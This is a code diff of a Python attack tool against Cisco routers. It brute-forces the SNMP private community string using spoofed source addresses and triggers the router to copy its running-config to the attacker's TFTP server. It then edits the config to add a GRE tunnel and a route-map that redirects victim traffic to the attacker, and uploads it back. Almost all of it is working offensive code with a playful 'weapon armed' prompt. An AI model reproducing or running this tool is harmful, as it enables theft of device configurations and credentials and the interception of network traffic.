@@ -11,6 +11,7 @@ from subprocess import *
 from kamene.all import *
 from requests import get
 from signal import SIGTERM
+from ipaddress import ip_network
 from ptftplib.tftpserver import TFTPServer
 import sys
 import nmap
@@ -62,11 +63,11 @@ for i,x in enumerate(sys.argv):
         LHOST=sys.argv[i+1]
     elif x.lower() in ["-c","--config"]:
         CONFIG=sys.argv[i+1]
-    elif x.lower() in ["-d"]:
+    elif x == "-d":
         debug = 1
-    elif x.lower() in ["-dd"]:
+    elif x == "-dd":
         debug = 2
-    elif x.lower() in ["--clean"]:
+    elif x == "--clean":
         clean = True
 
 if RHOST is None:
@@ -84,11 +85,12 @@ sys.stdout.write(f"[*] Using LHOST {LHOST}\n")
 # ;;;;;;; Cleanup ;;;;;;;
 if clean:
     if debug > 0:
-        sys.stdout.write("[D] Cleaning up old stuff...\n")
-    os.system("rm ./running-config* 1>/dev/null 2>&1")
-    os.system("rm ./snmpcommunities* 1>/dev/null 2>&1")
-    os.system("modprobe -r ip_gre 1>/dev/null 2>&1")
-    os.system("iptables -F")
+        print("[D] Cleaning up old stuff...")
+    os.system("/bin/rm running-config 1>/dev/null 2>&1")
+    os.system("/bin/rm running-config.old 1>/dev/null 2>&1")
+    os.system("/bin/rm snmpcommunities.lst 1>/dev/null 2>&1")
+    os.system("/sbin/modprobe -r ip_gre 1>/dev/null 2>&1")
+    os.system("/usr/sbin/iptables -F")
 
 # ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 # ;;;;;; INITIAL RECON ;;;;;;;;
@@ -100,13 +102,12 @@ nm.scan(hosts=RHOST,arguments=nmap_args)
 if nm[RHOST]['status']['state'] not in ['up']:
     sys.stderr.write(f"[-] Host {RHOST} is not up\n\n")
     sys.exit(-1)
-sys.stdout.write(f"[*] {RHOST} appears up\n")
+print(f"[*] {RHOST} appears up")
 
 if nm[RHOST]['udp'][RPORT]['state'] not in ['open','open|filtered']:
     sys.stderr.write(f"[-] Port {RPORT} is not open on rhost {RHOST}\n\n")
     sys.exit(-1)
-sys.stdout.write(f"[*] {RHOST}:{RPORT} appears open\n")
-sys.stdout.flush()
+print(f"[*] {RHOST}:{RPORT} appears open")
 
 
 # ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -123,10 +124,9 @@ if not snmpcommunities.exists():
     with open(list_file,"wb") as list_file_fd:
         response = get(url)
         list_file_fd.write(response.content)
-    sys.stdout.write("[*] List file saved as: ./snmpcommunities.lst\n")
+    print("[*] List file saved as: ./snmpcommunities.lst")
 else:
-    sys.stdout.write("[*] Looks like an snmpcommunities list is already present...\n")
-sys.stdout.flush()
+    print("[*] Looks like an snmpcommunities list is already present...")
 
 """
 # Brute for other public communities
@@ -156,7 +156,7 @@ communities = ['public']
 # for use in ACLs
 
 # EXAMPLE: ['FastEthernet0/0', '    IP address: 192.168.102.203  Netmask: 255.255.254.0',
-sys.stdout.write("[*] Getting interfaces and networks...\n")
+print("[*] Getting interfaces and networks...")
 snmp_output = nm.scan(hosts=RHOST,arguments="-sU -p161 --script=snmp-interfaces")
 snmp_output = nm[RHOST]['udp'][RPORT]['script']['snmp-interfaces'].lstrip().rstrip().split('\n')
 
@@ -175,10 +175,9 @@ for i in range(0,len(snmp_output2)-1):
             snmp_output3[snmp_output2[i]] = snmp_output2[i+1].split(' ')
 
 if debug > 0:
-    sys.stderr.write(   f"[D] SNMP_OUTPUT: {snmp_output}\n"\
-                        f"[D] SNMP_OUTPUT2: {snmp_output2}\n"\
-                        f"[D] SNMP_OUTPUT3: {snmp_output3}\n")
-    sys.stderr.flush()
+    print(  f"[D] SNMP_OUTPUT: {snmp_output}\n"\
+            f"[D] SNMP_OUTPUT2: {snmp_output2}\n"\
+            f"[D] SNMP_OUTPUT3: {snmp_output3}\n")
 
 masks = {"255.255.255.255":"0.0.0.0","255.255.255.254":"0.0.0.1",
 "255.255.255.252":"0.0.0.3","255.255.255.248":"0.0.0.7",
@@ -206,17 +205,15 @@ for k,v in enumerate(snmp_output3):
     sys.stdout.write(f"[*] Using the following network in the ACLs: {pref} {wild}\n")
     networks[snmp_output3[v][2]] = masks[snmp_output3[v][5]]
     if debug > 0:
-        sys.stderr.write(   f"[D] PREF: {pref}\n"\
-                            f"[D] WILD: {wild}\n"\
-                            f"[D] NETWORKS: {networks}\n")
-
-        sys.stderr.flush()
+        print(  f"[D] PREF: {pref}\n"\
+                f"[D] WILD: {wild}\n"\
+                f"[D] NETWORKS: {networks}\n")
 
 # ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 # ;;;;;; Spin-up TFTP server    ;;;;;;;;;; 
 # ;;;;;; and check if listening  ;;;;;;;;;
 
-sys.stdout.write(f"[*] Spinning up TFTP server on host {LHOST}:69\n")
+print(f"[*] Spinning up TFTP server on host {LHOST}:69")
 
 
 iface = 'tap0'
@@ -230,16 +227,15 @@ for k,v in enumerate(net_connections()):
     if 69 == v[3][1]:
         pids.append(str(v[6]))
 
-sys.stdout.write("[*] killing off previously existing TFTP servers\n")
-
+print("[*] killing off previously existing TFTP servers")
 for k,v in enumerate(pids):
     try:
         kill(int(v),SIGTERM)
     except ProcessLookupError:
         continue
     tftp_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
-    sys.stdout.write("[*] Now starting up our server...\n")
-    os.system(f"atftpd --daemon --bind-address {LHOST} --logfile /var/log/atftpd.log --user root {tftp_dir}")
+    print("[*] Now starting up our server...")
+    os.system(f"/usr/sbin/atftpd --daemon --bind-address {LHOST} --logfile /var/log/atftpd.log --user root {tftp_dir}")
 
     for k,v in enumerate(net_connections()):
         if f"{LHOST}" == v[3][0]:
@@ -250,9 +246,9 @@ for k,v in enumerate(pids):
         sys.stderr.write(f"[-] Host not listening on {LHOST}:69!!!\n")
         sys.exit(-1)
     else:
-        sys.stdout.write("[*] TFTP Server running\n")
+        print("[*] TFTP Server running")
         if debug > 0:
-            sys.stdout.write(f"[D] Server info {res} PID={pid}\n")
+            print(f"[D] Server info {res} PID={pid}")
 
     
 # ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -266,22 +262,54 @@ for k,v in enumerate(networks):
         break
 
 # Iterate through that .lst file, using the above address for the spoof
-running_config = Path("./running-config")
+running_config = Path("running-config")
 i=IP(src=spoof_addr,dst=RHOST)
 u=UDP(dport=161)
-with open('./snmpcommunities.lst','r') as snmp_list:
-    sys.stdout.write("[*] Brute forcing the private commuinty and attemping config download...\n")
+with open('snmpcommunities.lst','r') as snmp_list:
+    print("[*] Brute forcing the private commuinty and attemping config download...")
     while not running_config.exists():
         for k,v in enumerate(snmp_list):
             private_community = v.strip()
             s=SNMP(community=private_community,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"1.3.6.1.4.1.9.2.1.55.{LHOST}"),value="running-config")]))
+            
+            if debug > 0:
+                print(  f"---------------------------------\n"\
+                        f"i=IP\n"\
+                        f"|- src={spoof_addr}\n"\
+                        f"|- dst={RHOST}\n"\
+                        f" |- u=UDP\n"\
+                        f"  |- dport=161\n"\
+                        f"  |- s=SNMP\n"\
+                        f"   |- Community = {private_community}\n"\
+                        f"   |- PDU\n"\
+                        f"    |- ASN1_OID:\n"\
+                        f"     |- 1.3.6.1.4.1.9.2.1.55.{LHOST}\n"\
+                        f"     |- value = running-config\n"\
+                        f"-----------------------------------\n")
+            else:
+                sys.stdout.write(".")
+                sys.stdout.flush()
+            
             send(i/u/s,count=1,verbose=0)
-            sys.stdout.write(".")
-                
-            if running_config.exists():
-                sys.stdout.write(f"\n[+] Private community found [{private_community}] : cisco running-config downloaded\n")
+
+            ctr = 0
+            found = False
+            sys.stdout.write('\n')
+            while(ctr < 50):
+                if running_config.exists():
+                    print(f"\n[+] Private community found [{private_community}] : cisco running-config downloaded")
+                    found = True
+                    break
+                else:
+                    sys.stdout.write('.')
+                    sys.stdout.flush()
+                    ctr+=1
+            if found:
                 break
+
+            time.sleep(1)
         break
+
 
 # ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 # ;;;;;;;; CONFIG BUILD ;;;;;;;;;;;
@@ -358,18 +386,35 @@ new_map = "route-map "
 with open(CONFIG,"r") as fd:
     for line in fd:
         if new_map in line[0:10]:
-            for i in range(0,5):
+            for i in range(1,5):
                 new_map += str(i)
                 if new_map not in line[0:15]:
                     new_map += "permit 10\n"
                     new_map += f" match ip address {acl_num}\n"
-                    new_map += f" set ip next-hop {LHOST}\n"
+                    new_map += f" set ip next-hop {T_LHOST}\n"
                     break
             break
     new_map += f"{acl_num} permit 10\n"
     new_map += f" match ip address {acl_num}\n"
-    new_map += f" set ip next-hop {LHOST}\n"
+    new_map += f" set ip next-hop {T_LHOST}\n"
 
+
+private = ''
+cfg_line = []
+acl_line = []
+acl_tmp = 1
+cfg_tmp = 0
+print(f"[*] Getting actual private string")
+with open(CONFIG,"r") as fd:
+    for line in fd:
+        if "RW" in line:
+            cfg_line = line.split(' ')
+            break
+    
+private = cfg_line[2]
+if private != '':
+    if debug > 0:
+        print(f"[D] Setting private to {private}")
 
 tunnel_config = ""
 tunnel_config += tunnel_name
@@ -377,26 +422,21 @@ tunnel_config += tunnel_address
 tunnel_config += tunnel_source
 tunnel_config += tunnel_destination
 
-sys.stdout.flush()
-sys.stdout.write(   "[*] Using following tunnel configs\n"\
-                    "----------------------------------\n"\
-                    f"{tunnel_config}")
+print(  "[*] Using following tunnel configs\n"\
+        "----------------------------------\n"\
+        f"{tunnel_config}")
 
 
-sys.stdout.flush()
-sys.stdout.write(   "\n[*] Using the following ACLs\n"
-                    "----------------------------\n")
+print(  "\n[*] Using the following ACLs\n"
+        "----------------------------\n")
 
-sys.stdout.flush()
 for k,v in enumerate(access_list):
     sys.stdout.write(f"{v}")
 
 
-sys.stdout.flush()
-sys.stdout.write(   "\n[*] Using the following route map\n"\
-                    "---------------------------------\n"\
-                    f"{new_map}\n")
-
+print(  "\n[*] Using the following route map\n"\
+        "---------------------------------\n"\
+        f"{new_map}\n")
 
 # Drum up the new configuration file
 # using our custom configs
@@ -407,6 +447,7 @@ with open(CONFIG,"r") as fd:
         if debug > 0:
             sys.stderr.flush()
             sys.stderr.write(f"[D][old_cfg] {line}")
+
 # Get's LAN interfaces by  
 # filtering interfaces with 
 # RHOST or invalid addresses
@@ -449,53 +490,59 @@ for k,v in enumerate(old_cfg.split('\n')):
 
 
 if debug > 0:
-    sys.stdout.flush()
-    sys.stdout.write(   "\n\n--------------------------\n"\
-                        "------New Configs---------\n"
-                        "--------------------------\n\n")
+    print(  "\n\n--------------------------\n"\
+            "------New Configs---------\n"
+            "--------------------------\n\n")
     print(new_cfg)
 else:
-    sys.stdout.flush()
-    sys.stdout.write(f"[*] New Configuration created!\n")
+    print(f"[*] New Configuration created!\n")
 
 
 # Write to file and sanity check
-os.rename("./running-config","./running-config.old")
-with open("./running-config","w+") as fd:
+os.rename("running-config","running-config.old")
+with open("running-config","w+") as fd:
         fd.write(new_cfg)
 
-if debug > 0:
-    with open("./running-config","r") as fd:
-        for line in fd:
-            sys.stdout.write(f"[D] {line}")
-            sys.stdout.flush()
+lines = 0
+with open("running-config","r") as fd:
+    for i,x in enumerate(fd):
+        lines += 1
+if lines < 2:
+    sys.stderr.write(f"[-] Error writing new config file (empty file). Aborting..\n")
+    sys.exit(-1)
 
-same = True
-with open("./running-config","r") as fd_new, open("./running-config.old","r") as fd_old:
-    for line_new,line_old in zip(fd_new,fd_old):
-        if line_new != line_old:
-            same = False
-            break
-                
-if same:
-    sys.stderr.write("[-] Both versions of running-config are the same... check file write.\n")
-    sys.stderr.write("V new ------------------------new v\n")
-    sys.stderr.write(new_cfg)
-    sys.stderr.flush()
-    sys.stderr.write("^ new ------------------------old v\n")
-    sys.stderr.write(old_cfg)
-    sys.stderr.flush()
-    sys.stderr.write("^ old ------------------------old ^\n")
-    
+if debug > 0:
+    with open("running-config","r") as fd:
+        for line in fd:
+            print(f"[D] {line}".strip())
+
+
+# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+# ;;;;;;;;;  Setting up cidr  ;;;;;;;;;;
+# ;;;;;;;;;  len per wildcard ;;;;;;;;;;
+bit_len = {}
+nets = []
+ii = 32
+for i,x in enumerate(masks):
+    bit_len[masks[x]] = f"/{ii}"
+    ii -= 1
+for k,v in enumerate(networks):
+    nets.append(str(ip_network(f"{v}{bit_len[networks[v]]}",False)))
+
+if debug > 0:
+    print(f"[D] Wildcard converstion: {bit_len}")
+    print(f"[D] Using networks in routing update : {nets}")
+
 
 # ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 # ;;;;;; Setup the local tunnel interface ;;;;;
-sys.stdout.flush()
-sys.stdout.write(   f"[*] Bringing up Tunnel interface\n"\
-                    f"|-[>] modprobe ip_gre\n"\
-                    f"|-[>] iptunnel add mynet mode gre remote {RHOST} local {LHOST} ttl 255;\n"\
-                    f"|-[>] ip addr add {T_LHOST}/30 dev mynet;\n"\
-                    f"|-[>] ifconfig mynet up\n")
+print(  f"[*] Bringing up Tunnel interface\n"\
+        f"|--[>] modprobe ip_gre\n"\
+        f"|--[>] iptunnel add mynet mode gre remote {RHOST} local {LHOST} ttl 255;\n"\
+        f"|--[>] ip addr add {T_LHOST}/30 dev mynet;\n"\
+        f"|--[>] ifconfig mynet up")
+for net in nets:
+        print(f"|--[>] route add -net {net} dev mynet\n")
 
 system( f"iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE ;"\
         f"iptables --append FORWARD --in-interface mynet -j ACCEPT ;"\
@@ -504,33 +551,50 @@ system( f"iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQ
         f"iptunnel add mynet mode gre remote {RHOST} local {LHOST} ttl 225 ;"\
         f"ip addr add {T_LHOST}/30 dev mynet ;"\
         f"ifconfig mynet up" )
+for net in nets:
+        system(f"route add -net {net} dev mynet")
 
 # ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-# ;;;;;;;; BOMBS AWAY ;;;;;;;;;;;;
-sys.stdout.write(f"[*] Uploading new configuration file..\n")
+# ;;;;;;;; Launch ;;;;;;;;;;;;
+
+input(  "[*******************************]\n"\
+        "[....Please review the above....]\n"\
+        "[............settings...........]\n"\
+        "[....WEAPON STATUS:    ARMED....]\n"\
+        "[....PRESS ENTER TO CONTINUE....]\n"\
+        "[*******************************]\n")
+print(  "\n\n"\
+        ">>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<\n"\
+        ">>> [      MISSILE AWAY     ] <<<\n" \
+        ">>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<\n")
 
 i=IP(src=spoof_addr,dst=RHOST)
 u=UDP(dport=161)
-s=SNMP(community=private_community,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"1.3.6.1.4.1.9.2.1.53.{LHOST}"),value="running-config")]))
+s=SNMP(community=private,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"1.3.6.1.4.1.9.2.1.53.{LHOST}"),value="running-config")]))
 
-for x in range(0,3):
-    send(i/u/s,count=1,verbose=0)
-    time.sleep(1)
+if debug > 0:
+    print(  f"---------------------------------\n"\
+            f"i=IP\n"\
+            f"|- src={spoof_addr}\n"\
+            f"|- dst={RHOST}\n"\
+            f" |- u=UDP\n"\
+            f" |- dport=161\n"\
+            f" |- s=SNMP\n"\
+            f"  |- community = {private}\n"\
+            f"  |- PDU\n"\
+            f"   |- ASN1_OID:\n"\
+            f"    |-----> 1.3.6.1.4.1.9.2.1.53.{LHOST}\n"\
+            f"    |-----> value = running-config\n"
+            f"----------------------------------\n")
 
-# Verify connectivity to hosts
-sys.stdout.write(f"[*] Testing for connectivity to tunnel endpoint...\n")
-ctr = 0 
-while(ctr <= 6):
-    ret = srloop(IP(src=T_LHOST, dst=T_RHOST)/ICMP(),count=5)
-    if ret[0].summary() == None:
-        time.sleep(1)
-        ctr += 1
-    elif "echo-reply" in ret[0].summary():
-        sys.stdout.write(f"[+] Tunnel endpoint {T_RHOST} is up\n")
-        break
-    elif ctr == 5:
-        sys.stdout.write(f"[-] Cannot reach Tunnel endpoing {T_RHOST}. Check running-configs\n")
-        sys.exit(-1)
-
-
-
+up=False
+while not up:
+    print("[*] Uploading 'bad' config")
+    send(i/u/s,count=10,verbose=0)
+ 
+    with os.popen(f"/bin/ping {T_RHOST} -c3") as proc:
+        for k,v in enumerate(proc.read().split('\n')):
+            if "bytes from" in v:
+                print(v)
+                up = True
+                break
